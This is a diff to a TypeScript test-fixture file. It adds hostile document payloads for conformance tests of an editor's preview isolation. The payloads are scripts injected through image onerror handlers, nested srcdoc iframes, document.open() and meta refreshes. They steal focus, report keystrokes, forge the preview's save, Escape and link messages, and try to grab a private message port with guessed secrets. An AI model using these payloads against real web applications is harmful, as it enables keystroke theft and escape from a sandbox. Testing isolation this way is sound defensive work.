@@ -51,15 +51,46 @@ export const LONG_TEXT = `{{nyml\nkind: document\ntitle: Preview isolation\nuid:
  * A document script that steals the focus (ES5; no double quote, so it fits an HTML attribute): it
  * puts an input in the preview and focuses it every 40 ms, posts a heartbeat
  * (`orz-conformance-theft`) so the harness knows it runs, and on every key it receives reports it
- * (`orz-conformance-stolen`) and forges the preview's own messages — a save key, Escape, "active",
- * a link — and a popup, all inside the user activation that key gives the frame.
+ * (`orz-conformance-stolen`) and forges the preview's own messages — a save key, the view key,
+ * Escape, "active", a link — and a popup, all inside the user activation that key gives the frame.
  */
 export const THEFT_SCRIPT = "(function(){if(window.__orzTheft)return;window.__orzTheft=1;var P=parent,i=document.createElement('input');i.setAttribute('aria-label','theft');(document.body||document.documentElement).appendChild(i);"
-  + "document.addEventListener('keydown',function(e){P.postMessage({type:'orz-conformance-stolen',key:e.key},'*');P.postMessage({type:'orz-preview-active'},'*');P.postMessage({type:'orz-preview-key',key:'s'},'*');P.postMessage({type:'orz-preview-key',key:'Escape'},'*');P.postMessage({type:'orz-preview-link',href:'https://example.org/stolen-'+e.key},'*');try{window.open('https://example.org/stolen-popup')}catch(x){}},true);"
+  + "document.addEventListener('keydown',function(e){P.postMessage({type:'orz-conformance-stolen',key:e.key},'*');P.postMessage({type:'orz-preview-active'},'*');P.postMessage({type:'orz-preview-key',key:'s'},'*');P.postMessage({type:'orz-preview-key',key:'\\\\'},'*');P.postMessage({type:'orz-preview-key',key:'Escape'},'*');P.postMessage({type:'orz-preview-link',href:'https://example.org/stolen-'+e.key},'*');try{window.open('https://example.org/stolen-popup')}catch(x){}},true);"
   + "setInterval(function(){P.postMessage({type:'orz-conformance-theft'},'*');if(document.activeElement!==i)i.focus()},40)})()";
 
 /** A document whose preview runs {@link THEFT_SCRIPT} (from an image error handler, as a document script would). */
 export const THEFT_TEXT = `{{nyml\nkind: document\ntitle: Focus theft\nuid: doc-conformance7t8u9v\n}}\n\n# Focus theft\n\nA picture <img src="x-missing.png" alt="" onerror="${THEFT_SCRIPT}">\n\n${Array.from({ length: 40 }, (_, i) => `Line ${i + 1} of the text the reader edits.\n`).join('\n')}`;
+
+/**
+ * What a document that replaced the preview's own (`document.open()`, a navigation, a meta refresh)
+ * would do to get the bridge's private port (ES5; no double quote): ask for it with readies — plain,
+ * with a channel, with a guessed secret, every 250 ms — and, should it get a port, send a save, the
+ * view key, Escape, a link and a scroll through it. `window.__orzGot` records `[port]` when it got one.
+ */
+export const GRAB_SCRIPT = "window.__orzGot='';addEventListener('message',function(e){var d=e.data;if(d&&d.type==='orz-preview-port'&&e.ports&&e.ports[0]){window.__orzGot+='[port]';var P=e.ports[0];P.postMessage({type:'orz-preview-key',key:'s'});P.postMessage({type:'orz-preview-key',key:'\\\\'});P.postMessage({type:'orz-preview-key',key:'Escape'});P.postMessage({type:'orz-preview-link',href:'https://example.org/port'});P.postMessage({type:'orz-preview-scrolled',top:0,max:100000})}},true);"
+  + "var n=0,T=parent,ask=function(){T.postMessage({type:'orz-preview-ready'},'*');T.postMessage({type:'orz-preview-ready',channel:'g1'},'*');T.postMessage({type:'orz-preview-ready',channel:'g2',secret:'guess'},'*');if(++n<12)setTimeout(ask,250)};ask()";
+
+/** The page a document's meta refresh navigates its preview to (served by the harness on its other origin). */
+export const GRAB_PAGE = `<!doctype html><meta charset="utf-8"><title>replaced preview</title><script>${GRAB_SCRIPT}</script>`;
+
+const inAttribute = (js: string): string => js.replace(/&/g, '&amp;').replace(/"/g, '&quot;');
+const replacedDoc = (body: string): string => `{{nyml\nkind: document\ntitle: Replaced preview\n}}\n\n# Replaced preview\n\n${body}\n\n${Array.from({ length: 30 }, (_, i) => `Line ${i + 1} of a replaced preview.\n`).join('\n')}`;
+
+/**
+ * Documents whose previews are replaced or nested by their own content (round 3 of closed loop 2, the
+ * vectors of option B): a nested `<iframe srcdoc>` that steals the focus and posts forged readies,
+ * keys and links to the top; `document.open()` then {@link GRAB_SCRIPT}; a meta refresh to an http
+ * page of another origin (`grabUrl`, serving {@link GRAB_PAGE}) and one to a `data:` URL running it.
+ */
+export function replacedTexts(grabUrl: string): Record<string, string> {
+  const nested = `${GRAB_SCRIPT};var i=document.createElement('input');document.documentElement.appendChild(i);setInterval(function(){i.focus();var T=top;T.postMessage({type:'orz-preview-ready',channel:'n'},'*');T.postMessage({type:'orz-preview-key',key:'s'},'*');T.postMessage({type:'orz-preview-key',key:'\\\\'},'*');T.postMessage({type:'orz-preview-link',href:'https://example.org/nested'},'*')},60)`;
+  return {
+    'nested frame': replacedDoc(`<iframe srcdoc="${inAttribute(`<script>${nested}</` + 'script>')}"></iframe>`),
+    'document.open': replacedDoc(`<img src="x-missing.png" alt="" onerror="${inAttribute(`setTimeout(function(){document.open();document.write('<p>replaced</p>');document.close();${GRAB_SCRIPT}},300)`)}">`),
+    'meta refresh http': replacedDoc(`<meta http-equiv="refresh" content="1;url=${grabUrl}">`),
+    'meta refresh data': replacedDoc(`<meta http-equiv="refresh" content="1;url=data:text/html;base64,${btoa(GRAB_PAGE)}">`),
+  };
+}
 
 /**
  * A document with includes (FC-18 §8.3, D4) and the resolved includes its file carries in
